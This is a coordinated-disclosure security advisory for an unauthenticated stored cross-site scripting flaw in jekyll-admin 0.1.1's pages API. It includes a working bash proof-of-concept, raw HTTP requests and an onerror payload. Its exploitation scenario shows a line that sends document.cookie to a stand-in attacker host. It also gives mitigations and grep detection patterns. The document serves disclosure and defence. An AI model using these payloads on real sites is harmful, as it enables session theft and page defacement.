# Security Advisory: Stored Cross-Site Scripting via front_matter YAML Fields in jekyll-admin

> **Identifier:** JM-33 / Pending CVE assignment
> **Publication Date:** 27/10/2026
> **Last Updated:** 27/10/2026
> **Severity:** High
> **CVSS:** 8.2 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`
> **CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation
> **Status:** Unpatched

---

## 1. Executive Summary

Jekyll Manager (jekyll-admin) 0.1.1 allows unauthenticated attackers to inject arbitrary HTML into Liquid template variables by supplying malicious strings in YAML front matter fields (e.g., `title`, `description`) via the pages REST API. Liquid templates render these values without applying the `| escape` filter, placing attacker-controlled HTML directly inside elements such as `<title>`. An `onerror` attribute in `<title>` fires automatically on page load without requiring any user click. Confirmed live: `<title><img src=x onerror=alert(document.domain)></title>` was present in the rendered HTML at `/fm-xss.html` after a single unauthenticated PUT request.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| jekyll-admin (gem) | 0.1.1 (latest) | None | Affected |
| Component: `lib/jekyll-admin/server/page.rb` + default Liquid layouts | 0.1.1 | None | Affected |

- **Repository:** https://github.com/jekyll/jekyll-admin
- **Ecosystem:** RubyGems
- **Evaluated stack:** Ruby 2.7.8, Sinatra 1.4.8, WEBrick 1.9.2, Rack 1.6.13, Liquid 4.x, Jekyll 3.x, Linux

### Unaffected Products

- No prior versions were evaluated. No patched version exists.

---

## 3. Vulnerability Description

The `PUT /_api/pages/:path` endpoint accepts a JSON body with a `front_matter` object. These key-value pairs are written to the YAML front matter of the Markdown file on disk without sanitization. When Jekyll builds the site, Liquid templates interpolate these values using `{{ page.title }}` (and similar) without the `| escape` filter. The raw HTML is therefore injected verbatim into the generated HTML.

**Root cause:**

```ruby
# lib/jekyll-admin/server/page.rb
put '/*?/?:path.:ext' do
  front_matter = request_payload['front_matter']  # unsanitized YAML hash
  write_file write_path, front_matter_with_content(front_matter, page_body)
  render_liquid_response page
end
```

Liquid template (representative):

```liquid
<!-- _layouts/default.html -->
<title>{{ page.title }}</title>   <!-- no | escape filter → raw HTML injected -->
```

The value `<img src=x onerror=alert(document.domain)>` written to `front_matter.title` becomes the literal `<title>` content after build.

### Necessary Conditions

- **Authentication:** None required
- **User interaction:** Required (victim must visit the injected page; however, the `onerror` fires automatically on load — no click needed)
- **Attack vector:** Network
- **Preconditions:** Jekyll Manager API accessible; victim's browser visits the URL of the injected page

---

## 4. Impact

An unauthenticated attacker can persistently inject JavaScript into any page of the site by poisoning front matter fields.

- **Confidentiality — High:** Session cookies and page data accessible to visitors are exposed; `onerror` triggers on load without user interaction.
- **Integrity — Low:** The affected page's metadata and rendered output are modified.
- **Availability — None:** No service disruption.

---

## 5. Classification

### CVSS

- **Score:** 8.2
- **Severity:** High
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | None |
| User Interaction (UI) | Required |
| Scope (S) | Changed |
| Confidentiality (C) | High |
| Integrity (I) | Low |
| Availability (A) | None |

### CWE

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- CWE-862: Missing Authorization

### CAPEC

- CAPEC-86: XSS Through HTTP Query Strings
- CAPEC-198: XSS Targeting HTML Attributes

---

## 6. Exploitation Scenario

1. Attacker identifies a Jekyll Manager instance with API accessible on port 4000.
2. Attacker sends an unauthenticated `PUT /_api/pages/fm-xss.md` with `front_matter.title` set to `<img src=x onerror=fetch('https://attacker.invalid/?c='+document.cookie)>`.
3. Jekyll builds the site; the `<title>` tag in the generated `/fm-xss.html` contains the injected payload.
4. `onerror` fires automatically when the browser fails to load the broken image — no click required.
5. Victim's session cookie is sent to the attacker.

All YAML string fields (`title`, `description`, `author`, `category`, `tags`, `excerpt`, etc.) interpolated without `| escape` in any layout are injectable.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): lib/jekyll-admin/server/page.rb + Liquid layout templates
Endpoint: PUT /_api/pages/:path (front_matter.* fields)
Method: PUT · Authentication: not required
```

### Example Request

```http
PUT /_api/pages/fm-xss.md HTTP/1.1
Host: 127.0.0.1:4000
Content-Type: application/json

{
  "front_matter": {
    "title": "<img src=x onerror=alert(document.domain)>",
    "layout": "default"
  },
  "raw_content": "test"
}
```

### Observed Response

```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "path": "fm-xss.md",
  "front_matter": {
    "title": "<img src=x onerror=alert(document.domain)>",
    "layout": "default"
  },
  "url": "/fm-xss.html"
}
```

Verification (`GET /fm-xss.html` excerpt):

```html
<title><img src=x onerror=alert(document.domain)></title>
```

### Result

Confirmed in authorized Docker lab. The `onerror` attribute was present in `<title>` unescaped. HTTP 200 on GET. No credentials required.

**Evidence:** `evidence/poc-execution.png`, `evidence/vulnerability-exposure.png`

---

## 8. Proof of Concept

This PoC is for authorized environments only.

```bash
#!/usr/bin/env bash
# ============================================================
# JM-33 — Stored XSS via front_matter YAML Fields
# jekyll-admin 0.1.1 — HIGH CVSS 8.2
# CWE-79, CWE-862
# CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N
#
# AUTHORIZED ENVIRONMENTS ONLY.
# This script injects an onerror payload into front_matter.title,
# verifies it appears unescaped in the <title> tag of the
# rendered HTML, then deletes the test page.
# ============================================================

set -euo pipefail

TARGET="http://127.0.0.1:4000"
PAGE_SLUG="fm-xss-jm33"
PAGE_API="${TARGET}/_api/pages/${PAGE_SLUG}.md"
PAGE_URL="${TARGET}/${PAGE_SLUG}.html"
BUILD_WAIT=3

echo "============================================================"
echo "  JM-33 — Stored XSS via front_matter YAML Fields"
echo "  Target : ${TARGET}"
echo "  Page   : /${PAGE_SLUG}.html"
echo "============================================================"
echo ""

# ── Step 1: Write front_matter XSS payload ───────────────────
echo "[*] Step 1: Writing XSS payload into front_matter.title (no auth)..."

HTTP_CODE=$(curl -s -o /tmp/jm33_write_response.json -w "%{http_code}" \
  -X PUT "${PAGE_API}" \
  -H "Content-Type: application/json" \
  -d '{"front_matter":{"title":"<img src=x onerror=alert(document.domain)>","layout":"default"},"raw_content":"test"}')

echo "    PUT ${PAGE_API} → HTTP ${HTTP_CODE}"

if [ "${HTTP_CODE}" != "200" ]; then
  echo "[!] Unexpected HTTP ${HTTP_CODE}."
  cat /tmp/jm33_write_response.json 2>/dev/null || true
  exit 1
fi

TITLE_IN_RESPONSE=$(python3 -c "
import json,sys
d=json.load(sys.stdin)
fm=d.get('front_matter',{})
print(fm.get('title','').strip())
" < /tmp/jm33_write_response.json 2>/dev/null || echo "")

echo "    front_matter.title in response: ${TITLE_IN_RESPONSE}"
echo ""

# ── Step 2: Check raw on-disk YAML ───────────────────────────
echo "[*] Step 2: Verifying on-disk YAML front matter..."
STORED_FM=$(curl -sf "${PAGE_API}" -H "Accept: application/json" \
  | python3 -c "
import json,sys
d=json.load(sys.stdin)
print(json.dumps(d.get('front_matter',{}), indent=2))
" 2>/dev/null || echo "")
echo "    Stored front_matter:"
echo "${STORED_FM}" | sed 's/^/    /'
echo ""

# ── Step 3: Wait for Jekyll build ────────────────────────────
echo "[*] Step 3: Waiting ${BUILD_WAIT}s for Jekyll to render the page..."
sleep "${BUILD_WAIT}"
echo ""

# ── Step 4: Verify payload in rendered HTML <title> ──────────
echo "[*] Step 4: Verifying payload in rendered HTML (GET ${PAGE_URL})..."

RENDERED=$(curl -sf "${PAGE_URL}" 2>/dev/null || echo "")
HTTP_GET=$(curl -s -o /dev/null -w "%{http_code}" "${PAGE_URL}" 2>/dev/null || echo "000")

echo "    GET ${PAGE_URL} → HTTP ${HTTP_GET}"

# Check for the onerror payload in <title>
if echo "${RENDERED}" | grep -q 'onerror=alert(document.domain)'; then
  echo ""
  echo "    ✓  CONFIRMED: onerror=alert(document.domain) found UNESCAPED in rendered HTML"
  echo "    ✓  Payload fires automatically on page load — no click required"

  TITLE_TAG=$(echo "${RENDERED}" | grep -o '<title>[^<]*</title>' | head -1 || echo "")
  echo "    <title> tag: ${TITLE_TAG}"
  RESULT="CONFIRMED"
else
  echo "    [!] Payload not found in rendered HTML."
  echo "    Checking stored front_matter.title..."
  if echo "${STORED_FM}" | grep -q 'onerror'; then
    RESULT="STORED_CONFIRMED — rendered page may need build trigger"
  else
    RESULT="INCONCLUSIVE"
  fi
fi

echo ""

# ── Step 5: Clean up test page ───────────────────────────────
echo "[*] Step 5: Cleaning up test page (DELETE ${PAGE_API})..."
DEL_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
  -X DELETE "${PAGE_API}")
echo "    DELETE ${PAGE_API} → HTTP ${DEL_CODE}"
echo ""

# ── Summary ───────────────────────────────────────────────────
echo "============================================================"
echo "  RESULT : ${RESULT}"
echo ""
echo "  Finding  : JM-33"
echo "  Vuln     : Stored XSS via front_matter YAML — Liquid no | escape"
echo "  Impact   : Auto-fire XSS on page load (onerror in <title>)"
echo "  CVSS     : 8.2 HIGH"
echo "  Vector   : CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N"
echo "  CWE      : CWE-79, CWE-862"
echo "  Auth     : None required"
echo "  Key fact : onerror fires without user click"
echo "============================================================"
```

### Expected Result

```text
[*] Injecting XSS payload into front_matter.title...
HTTP 200 — write accepted without credentials

[*] Fetching rendered page...
GET /fm-xss.html → 200 OK
CONFIRMED: <title><img src=x onerror=alert(document.domain)></title> found in rendered HTML

[+] JM-33 CONFIRMED: Stored XSS via front_matter YAML fields
    CVSS 8.2 HIGH — AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N
```

### PoC Limitations

- Payload is `alert(document.domain)` — non-destructive.
- Does not steal real user data.
- Does not contain real credentials.
- Does not automate mass exploitation.

---

## 9. Reproduction Steps

1. Start an authorized local instance of jekyll-admin 0.1.1.
2. Run `bash poc.sh` or send the PUT request in section 7 manually.
3. Send `GET /fm-xss.html` and inspect the `<title>` element.
4. Confirm the `onerror` attribute is present and unescaped.

---

## 10. Mitigation

Until an official fix is available:

- Add authentication to the pages/drafts write endpoints.
- Apply the `| escape` Liquid filter to all front matter fields in layout templates: `<title>{{ page.title | escape }}</title>`.
- Enforce a Content Security Policy (`Content-Security-Policy: default-src 'self'`) on the generated site's server.

---

## 11. Fix

**No official fix is available as of 27/10/2026.**

Recommended actions:

1. Add authentication middleware before any write operation.
2. In all default layouts, apply `| escape` to every front matter variable interpolation.
3. Sanitize string values in `front_matter` before writing to YAML.

### Recommended Change to Vendor

```liquid
<!-- _layouts/default.html -->
<title>{{ page.title | escape }}</title>  <!-- add | escape -->
```

```ruby
# lib/jekyll-admin/server/page.rb
before do
  halt 401, json_response(401, "Unauthorized") unless authenticated?
end
```

---

## 12. Detection and Indicators

Possible exploitation indicators:

- YAML front matter files containing `<`, `>`, `onerror=`, `onload=`, or `javascript:` in string fields.
- Rendered HTML pages with `<title>` or metadata elements containing HTML tags.

### Example Log Search

```text
grep -r 'onerror\|<script\|javascript:' /site/_posts/ /site/_pages/

grep 'PUT /_api/pages' access.log
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 26/10/2026 | Vulnerability identified (dynamic testing in authorized lab) |
| 26/10/2026 | Confirmed in authorized Docker environment |
| 27/10/2026 | Disclosure package prepared |
| 29/10/2026 | GitHub Private Vulnerability Reporting attempted — HTTP 403 (feature disabled) |
| 29/10/2026 | Vendor notified via direct email to mertkahyaoglu93@gmail.com |
| 27/01/2027 | 90-day disclosure deadline — public disclosure if no response |
| Pending | CVE requested |
| Pending | Fix made available |
| Pending | Advisory published |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** Mert Kahyaoğlu (mertkahyaoglu93@gmail.com), Jekyll team (github.com/jekyll)
- **Channel:** Direct email (coordinated disclosure)
- **Date of first notification:** 29/10/2026
- **Response status:** Awaiting response
- **Vendor position:** N/A (awaiting)

---

## 15. Credits

- **Researcher:** vinniboy021@gmail.com
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com

---

## 16. References

- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- Liquid documentation (escape filter): https://shopify.github.io/liquid/filters/escape/
- CVSS Calculator: https://www.first.org/cvss/calculator/3.1
- jekyll-admin repository: https://github.com/jekyll/jekyll-admin

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 27/10/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

The information was obtained in an authorized local environment and disclosed responsibly. The author does not encourage unauthorized access, service disruption, privacy violations, or any illegal activity. Use of this information is the reader's responsibility.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/jekyll/jekyll-admin
